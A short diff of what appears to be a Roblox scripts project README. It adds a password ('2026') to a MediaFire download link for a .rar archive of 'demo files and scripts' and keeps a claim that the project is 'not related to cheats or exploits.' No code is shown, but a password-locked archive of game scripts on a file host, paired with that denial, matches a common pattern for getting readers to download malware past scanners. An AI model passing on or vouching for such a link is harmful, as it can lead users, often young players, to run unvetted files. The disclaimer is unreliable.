@@ -38,7 +38,7 @@ Neutral
 
 Additional demo files and scripts:
 
-👉 https://www.mediafire.com/file/vzqpyfncmpwym22/Roblox_scripts_.rar/file
+👉 https://www.mediafire.com/file/vzqpyfncmpwym22/Roblox_scripts_.rar/file password:2026
 
 This project is intended for educational and development purposes only inside Roblox.
 It is not related to cheats or exploits.
